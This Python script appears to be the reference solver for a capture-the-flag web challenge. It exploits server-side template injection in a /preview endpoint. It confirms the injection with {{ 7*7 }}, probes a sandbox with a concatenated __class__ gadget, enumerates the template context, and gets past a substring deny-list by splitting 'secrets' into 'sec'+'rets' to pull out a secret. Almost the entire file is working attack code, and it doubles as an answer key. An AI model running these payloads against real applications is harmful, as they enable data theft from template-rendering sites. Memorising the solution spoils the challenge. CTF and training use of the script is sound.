#!/usr/bin/env python3
"""
ZSCTF :: Broadsheet -- reference solver.

Intended path (exploits only the flaw that is in plain sight in challenge/app.py:
rendering user input as a template, behind a sandbox + a raw-substring filter):

  1. The /preview feature renders your snippet as a template -> SSTI. Confirm it:
     `{{ 7*7 }}` renders to `49`.

  2. RCE is a dead end here (by design). The engine is sandboxed: every gadget
     (`{{ ''.__class__ }}`, dynamically-built dunders, ...) either is rejected by
     the filter or resolves to nothing. So the goal is NOT code execution -- it
     is to read one in-app secret out of the render context.

  3. Enumerate the context. `{{ site }}` prints the settings object's repr, which
     MASKS secret values but reveals the secret keys -- including this instance's
     per-team flag key `dispatch_<hex>`.

  4. The obvious read `{{ site.secrets }}` / `{{ site['secrets'] }}` is refused:
     the filter denies the raw substring `secret`. But the filter is a deny-list
     of RAW substrings (CWE-184), so rebuild the name at evaluation time from
     pieces it allows:  `{{ site['sec' + 'rets'][<flag key>] }}`  -> the flag.

Egress is blocked in the deployment, so there is no "exfiltrate to my server"
shortcut; the flag is read directly out of the preview response.

Usage:
    python solve.py --url http://HOST:PORT
"""
import sys
import re
import json
import argparse
from urllib.parse import urlencode
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

FLAG_RE = re.compile(r"zerosecurectf\{[^}]*\}", re.IGNORECASE)
KEY_RE = re.compile(r"dispatch_[0-9a-f]+")
# The PUBLISHED strict flag format -- the discriminator that rejects the decoy
# "preview fixture" secret and the /debug decoy.
STRICT_FLAG = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


def preview(base, tpl, timeout=20):
    """POST a template snippet to /preview; return the server's JSON dict."""
    data = urlencode({"tpl": tpl}).encode()
    req = Request(base.rstrip("/") + "/preview", data=data,
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "Accept": "application/json"})
    try:
        with urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except HTTPError as e:
        try:
            return json.loads(e.read().decode("utf-8", "replace"))
        except Exception:
            return {"ok": False, "reason": "HTTP %s" % e.code}


def get_json(base, path, timeout=20):
    req = Request(base.rstrip("/") + path, headers={"Accept": "application/json"})
    with urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def rendered(resp):
    return resp.get("rendered", "") if resp.get("ok") else ""


def solve(base):
    # 0. learn the instance (non-secret) -- robust to host port remapping.
    try:
        who = get_json(base, "/whoami")
        print("[*] instance %s, render engine %s" % (who.get("fingerprint"), who.get("engine")))
    except Exception:
        pass

    # 1. confirm SSTI.
    r = preview(base, "{{ 7*7 }}")
    if rendered(r).strip() != "49":
        raise SystemExit("[-] no SSTI: {{ 7*7 }} -> %r" % r)
    print("[+] SSTI confirmed: {{ 7*7 }} -> 49")

    # 2. (sanity) show that RCE is sandboxed -- the gadget resolves to nothing.
    g = preview(base, "{{ ''['_'+'_'+'cl'+'ass'+'_'+'_'] }}")
    print("[*] sandbox check: dynamically-built __class__ -> %r (no RCE)" % rendered(g))

    # 3. enumerate the context; recover this instance's candidate flag key(s).
    #    The secrets bag holds MORE THAN ONE dispatch_<hex> key: a decoy
    #    "preview fixture" (listed first, to bait a grab-the-first-key solver)
    #    and the real flag key. The repr masks every value as '***', so we
    #    cannot tell them apart from the repr -- we must read each and verify.
    e = preview(base, "{{ site }}")
    repr_str = rendered(e)
    keys = list(dict.fromkeys(KEY_RE.findall(repr_str)))  # dedup, keep order
    print("[+] enumerated settings repr; dispatch_* key candidate(s) = %s" % keys)
    if not keys:
        keys = [None]  # fallback: dump the whole bag instead

    # 4. bypass the raw-substring filter by reassembling 'secrets' at eval time,
    #    read each candidate, and accept ONLY a value that satisfies the
    #    published strict format rule. The decoy fixture is UPPERCASE+hyphens and
    #    is rejected by it (verify-before-commit: the careful human's escape).
    for k in keys:
        payload = "{{ site['sec'+'rets'] }}" if k is None else "{{ site['sec'+'rets']['%s'] }}" % k
        x = preview(base, payload)
        out = rendered(x)
        for cand in FLAG_RE.findall(out):
            if STRICT_FLAG.match(cand):
                print("[+] key %s -> %s  (passes strict format: ACCEPTED)" % (k, cand))
                return cand
            print("[-] key %s -> %s  (fails strict format rule: decoy, REJECTED)" % (k, cand))
    raise SystemExit("[-] bypass reached but no format-valid flag found (only decoys)")


def main():
    ap = argparse.ArgumentParser(description="Broadsheet reference solver (sandboxed SSTI -> context secret read).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Broadsheet app")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
